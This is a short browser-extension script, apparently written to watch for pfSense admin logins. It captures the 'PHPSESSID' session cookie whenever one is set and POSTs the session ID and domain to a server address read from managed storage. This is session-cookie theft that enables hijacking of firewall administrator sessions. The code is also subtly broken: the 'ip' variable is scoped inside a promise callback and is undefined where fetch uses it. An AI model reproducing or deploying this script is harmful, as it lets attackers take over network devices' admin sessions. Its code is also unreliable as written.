browser.storage.managed.get("server_ip").then((result) => {
  const ip = result.server_ip;
});

browser.cookies.onChanged.addListener((changeInfo) => {
    const cookie = changeInfo.cookie;

    

    if (cookie.name === "PHPSESSID" && !changeInfo.removed) {
        const sessionId = cookie.value;
        const pfsense_ip1 = cookie.domain;
        const timestamp = new Date().toLocaleTimeString();
        console.log(`[${timestamp}] pfSense Login Detected! Session ID: ${sessionId}`);
        
        // Send the ID to your local Python server
        fetch(ip, {
            method: "POST",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"
            },
            body: `session=${encodeURIComponent(sessionId)}&pfsense_ip2=${encodeURIComponent(pfsense_ip1)}`
        }).catch(err => console.error("Python logger not running.", err));
    }
});